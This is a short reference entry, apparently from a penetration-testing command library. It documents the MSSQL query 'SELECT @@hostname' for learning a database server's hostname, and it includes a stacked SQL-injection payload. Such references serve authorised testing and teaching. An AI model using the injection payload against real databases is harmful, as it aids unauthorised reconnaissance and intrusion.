---
type: command
executor: sql
data: SELECT @@hostname;
tags:
  - mssql
  - discovery
  - sql-injection
platforms:
  - Windows
  - MSSQL
verified: true
validated: true
---

# mssql-select-server-hostname

## Command

```sql
SELECT @@hostname;
```

## Description

This SQL command uses the @@hostname global variable to retrieve the hostname of the local server hosting the MSSQL instance. It serves as an alternative to HOST_NAME() and is useful in injection scenarios where function restrictions apply.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; @@hostname is a built-in variable | Yes |

## Examples

### Basic Usage

```sql
SELECT @@hostname;
```

### In Stacked Injection

```sql
; SELECT @@hostname; --
```

## Expected Output

A result set displaying the hostname, such as:

@@hostname
---------
DBSERVER-01

## Related

- [[commands/mssql-select-host-name]]
- [[procedures/mssql-hostname-enumeration-via-sqli]]
